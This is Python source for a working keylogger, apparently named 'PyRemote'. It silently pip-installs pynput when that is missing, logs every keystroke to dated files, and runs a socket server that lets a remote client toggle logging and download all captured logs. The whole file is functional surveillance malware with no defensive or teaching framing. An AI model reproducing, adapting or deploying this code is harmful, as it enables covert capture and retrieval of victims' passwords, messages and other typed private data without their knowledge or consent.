import logging
import os
import time
import threading
import socket
import sys

try:
    from pynput.keyboard import Key, Listener
except ModuleNotFoundError:
    print("Installing pynput...")
    os.system("pip install pynput > NUL > NUL")
    from pynput.keyboard import Key, Listener


# CONSTANTS
FOLDERNAME: str = "temp"
MAINFOLDER = "PyRemote/"

HEADER: int = 64
PORT: int = 5050
SERVER: str = "127.0.0.1"
ADDR: tuple[str, int] = (SERVER, PORT)
FORMAT: str = "utf-8"
DISCONNECTED_MESSAGE: str = "DISCONNECT"

enabled: bool = True

try:
    os.mkdir(MAINFOLDER+FOLDERNAME)
except FileExistsError:
    pass

logging.basicConfig(filename=f"{MAINFOLDER}{FOLDERNAME}/{time.strftime('%Y-%m-%d')}.txt", level=logging.DEBUG, format=" %(asctime)s - %(message)s")


def loggingThread():
    global enabled
    def onPress(key):
        if enabled:
            logging.info(str(key))

    with Listener(on_press=onPress) as listener:
        listener.join()


STATUSFILE: str = f"{MAINFOLDER}dir.txt"
with open(STATUSFILE, "w+") as f:
    f.write("enabled")



logthread: threading.Thread = threading.Thread(target=loggingThread)
logthread.start()


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)


def handleConnection(conn, addr) -> None:
    global enabled
    connected: bool = True
    while connected:
        msg_length: any = conn.recv(HEADER).decode(FORMAT)
        if msg_length:
            msg_length = int(msg_length)
            msg: str = conn.recv(msg_length).decode(FORMAT)
            if msg == "toggle":
                enabled = not enabled
                print(enabled)
                conn.send(str(enabled).encode(FORMAT))
            elif msg == "logs":
                allLogs = os.listdir(f"{MAINFOLDER}/temp")
                conn.send(str(len(allLogs)).encode(FORMAT))
                for log in range(len(allLogs)):
                    size = os.path.getsize(f"{MAINFOLDER}{FOLDERNAME}/{allLogs[log]}")
                    conn.send(str(size).encode(FORMAT))
                    with open(f"{MAINFOLDER}{FOLDERNAME}/{allLogs[log]}") as f:
                        conn.sendall(f.read().encode(FORMAT))

def main():
    server.listen()
    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handleConnection, args=(conn, addr))
        thread.start()


if __name__ == "__main__":
    main()